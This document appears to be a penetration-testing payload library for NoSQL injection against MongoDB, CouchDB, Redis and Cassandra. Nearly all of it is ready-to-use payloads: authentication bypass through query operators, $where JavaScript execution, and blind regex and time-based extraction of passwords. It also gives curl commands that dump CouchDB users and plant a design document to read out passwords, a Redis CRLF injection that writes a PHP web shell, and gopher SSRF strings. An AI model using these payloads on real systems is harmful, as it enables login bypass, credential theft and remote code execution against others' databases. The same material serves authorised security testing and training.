---
id: "nosql-injection-payloads"
title: "NoSQL Injection Payload Library - MongoDB, CouchDB, Redis"
type: "payload"
category: "web-application"
subcategory: "sqli"
tags: ["nosql", "mongodb", "couchdb", "redis", "operator-injection", "auth-bypass", "blind-injection", "$where", "$regex", "$ne", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["nosql-injection", "sqli-payloads", "auth-bypass-payloads"]
updated: "2026-04-14"
---

## Overview

NoSQL injection payloads exploit query logic in document databases by injecting operators or JavaScript. Unlike SQLi, there is no standard query language -- techniques are database-specific. Focus on MongoDB (most common), then CouchDB, Redis. Found in Node.js/Express, Python/Flask, serverless, and any JSON-based API.

## MongoDB -- Authentication Bypass

### JSON body injection
```json
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$ne":"invalid"}}
{"username":"admin","password":{"$gte":""}}
{"username":"admin","password":{"$lt":"zzzzzzzzz"}}
{"username":"admin","password":{"$exists":true}}
{"username":"admin","password":{"$nin":[]}}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}
{"username":{"$regex":"admin"},"password":{"$ne":""}}
{"username":{"$regex":"^admin"},"password":{"$gt":""}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":{"$ne":null},"password":{"$ne":null}}
```

### URL-encoded (GET params / form-urlencoded)
```
username=admin&password[$ne]=
username=admin&password[$gt]=
username=admin&password[$ne]=invalid
username=admin&password[$exists]=true
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=admin&password[$gt]=
username[$regex]=^admin&password[$ne]=
username[$in][]=admin&username[$in][]=root&password[$ne]=
username[$ne]=invalid&password[$regex]=.*
```

### PHP/Express array injection
```
# PHP: username[]=admin converts to array
username[]=admin&password[$ne]=

# Express.js: qs parser converts brackets to objects
login?username[$ne]=x&password[$ne]=x
```

## MongoDB -- Operator Injection

### Comparison operators
```json
{"field":{"$ne":"value"}}
{"field":{"$gt":""}}
{"field":{"$gte":""}}
{"field":{"$lt":"zzzzz"}}
{"field":{"$lte":"zzzzz"}}
{"field":{"$in":["val1","val2"]}}
{"field":{"$nin":["blocked_value"]}}
{"field":{"$exists":true}}
{"field":{"$type":"string"}}
```

### Logical operators
```json
{"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":""}}
{"$and":[{"username":{"$ne":""}},{"password":{"$ne":""}}]}
{"$nor":[{"username":"blocked"}]}
{"$or":[{},{"field":{"$exists":true}}]}
```

### $where JavaScript execution
```json
{"$where":"1==1"}
{"$where":"this.username=='admin'"}
{"$where":"this.password.match(/.*/)"}
{"$where":"return true"}
{"$where":"this.constructor.constructor('return 1')()"}

// Time-based blind
{"$where":"sleep(5000)"}
{"$where":"if(this.username=='admin'){sleep(5000)}"}
{"$where":"(function(){sleep(5000);return true;})()"}
{"$where":"if(this.password.match(/^a/)){sleep(5000)}else{return false}"}

// Data exfiltration via $where
{"$where":"if(this.password.length==8){sleep(5000)}"}
{"$where":"if(this.password.charAt(0)=='a'){sleep(5000)}"}
{"$where":"if(this.password.startsWith('pass')){sleep(5000)}"}
```

### $regex data extraction
```json
// Character-by-character extraction
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^abc"}}
// Iterate through charset: a-z, A-Z, 0-9, special chars

// Length detection
{"username":"admin","password":{"$regex":"^.{8}$"}}
{"username":"admin","password":{"$regex":"^.{1,5}$"}}

// Case-insensitive
{"username":"admin","password":{"$regex":"^admin","$options":"i"}}

// Dot-all mode (newlines in values)
{"username":"admin","password":{"$regex":"^.*pass.*","$options":"si"}}
```

### Aggregation pipeline injection
```json
// If user input reaches aggregation pipeline
{"$lookup":{"from":"admin_users","localField":"_id","foreignField":"_id","as":"admin_data"}}
{"$group":{"_id":null,"passwords":{"$push":"$password"}}}
{"$project":{"password":1,"email":1,"_id":0}}
{"$match":{"role":"admin"}}
{"$unwind":"$sensitive_array"}
```

## MongoDB -- Blind Extraction Payloads

### Boolean-based blind
```json
// True condition (normal response)
{"username":{"$regex":"^a"},"password":{"$ne":""}}

// False condition (error/different response)
{"username":{"$regex":"^ZZZZZ"},"password":{"$ne":""}}

// Binary search approach
{"username":{"$regex":"^[a-m]"},"password":{"$ne":""}}
{"username":{"$regex":"^[a-f]"},"password":{"$ne":""}}
{"username":{"$regex":"^[a-c]"},"password":{"$ne":""}}
// Narrow down character by character
```

### Time-based blind
```json
{"username":"admin","$where":"if(this.password.match(/^a/)){sleep(5000);return true;}return false;"}
{"username":"admin","$where":"if(this.password.charAt(0)>'m'){sleep(5000)}"}

// Detect field names
{"$where":"if(Object.keys(this).length>5){sleep(5000)}"}
{"$where":"if(Object.keys(this)[0]=='_id'){sleep(5000)}"}
{"$where":"if(Object.keys(this)[1]=='username'){sleep(5000)}"}
```

## MongoDB -- WAF/Filter Bypass

```json
// Unicode bypass
{"username":"admin","password":{"\u0024ne":""}}
{"username":"admin","password":{"\u0024gt":""}}
{"username":"admin","password":{"\u0024regex":".*"}}

// Nested operator bypass (CVE-2025-23061)
{"$or":[{"password":{"$where":"sleep(5000)"}}]}

// URL encoding bypass
username=admin&password%5B%24ne%5D=
username=admin&password%5B%24gt%5D=

// Double encoding
username=admin&password%255B%2524ne%255D=

// Using $comment to pad
{"username":"admin","password":{"$ne":"","$comment":"bypass"}}

// Array wrapping
{"username":["admin"],"password":{"$ne":""}}

// Null byte
{"username":"admin\x00","password":{"$ne":""}}
```

## CouchDB Injection

### Default "Admin Party" (pre-3.0)
```bash
# Unauthenticated access -- check first
curl http://target:5984/
curl http://target:5984/_all_dbs
curl http://target:5984/database_name/_all_docs
curl http://target:5984/database_name/_all_docs?include_docs=true
curl http://target:5984/_users/_all_docs?include_docs=true
curl http://target:5984/_config
curl http://target:5984/_config/admins
```

### Mango query injection (CouchDB 2.0+)
```json
// Authentication bypass
{"selector":{"username":"admin","password":{"$ne":""}}}
{"selector":{"username":{"$regex":".*"},"password":{"$regex":".*"}}}

// Data extraction
{"selector":{"_id":{"$gt":null}},"fields":["_id","username","password"]}
{"selector":{"type":"user"},"fields":["username","password","email"],"limit":1000}
```

### Design document abuse
```bash
# If you can create design documents
curl -X PUT http://target:5984/db/_design/evil \
  -d '{"views":{"all":{"map":"function(doc){emit(doc._id,doc.password)}"}}}'
curl http://target:5984/db/_design/evil/_view/all
```

## Redis Injection

### Command injection (if user input reaches Redis commands)
```
# CRLF injection into Redis protocol
\r\nSET evil "injected"\r\n
\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET payload "<?php system($_GET['cmd']); ?>"\r\nSAVE\r\n

# SSRF to Redis (via gopher://)
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$11%0d%0ahello world%0d%0a

# Key enumeration
KEYS *
KEYS user:*
KEYS session:*
KEYS auth:*

# Data extraction
GET session:admin
HGETALL user:admin
LRANGE recent_logins 0 -1
SMEMBERS admin_users
```

### Redis Lua script injection
```
EVAL "return redis.call('keys','*')" 0
EVAL "local keys=redis.call('keys','*'); local result={}; for i,key in ipairs(keys) do result[i]=redis.call('get',key) end; return result" 0
```

## Cassandra Injection

```
# CQL injection (similar to SQL)
SELECT * FROM users WHERE username='admin' AND password='' OR ''=''
SELECT * FROM users WHERE username='admin'--
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

# Batch injection
BEGIN BATCH
  INSERT INTO users (id, role) VALUES (1, 'admin')
APPLY BATCH
```

## Detection Checklist

```
[ ] Identify backend database (MongoDB, CouchDB, Redis, Cassandra)
[ ] Test JSON body params with operator objects ({"$ne":""})
[ ] Test URL params with bracket notation (param[$ne]=)
[ ] Test $where with sleep() for time-based blind
[ ] Test $regex for boolean-based extraction
[ ] Test with Unicode-encoded operator names
[ ] Check for unauthenticated CouchDB access
[ ] Test SSRF to Redis via gopher://
[ ] Test aggregation pipeline injection
[ ] Verify with data extraction (not just auth bypass)
```

## Tools

- **NoSQLMap** -- Automated NoSQL injection
- **nosqli** -- Go-based NoSQL injection scanner
- **Burp Suite** -- Manual JSON manipulation
- **mongosh** -- MongoDB shell for payload testing
- **redis-cli** -- Redis command testing
- **nuclei** -- NoSQL injection templates
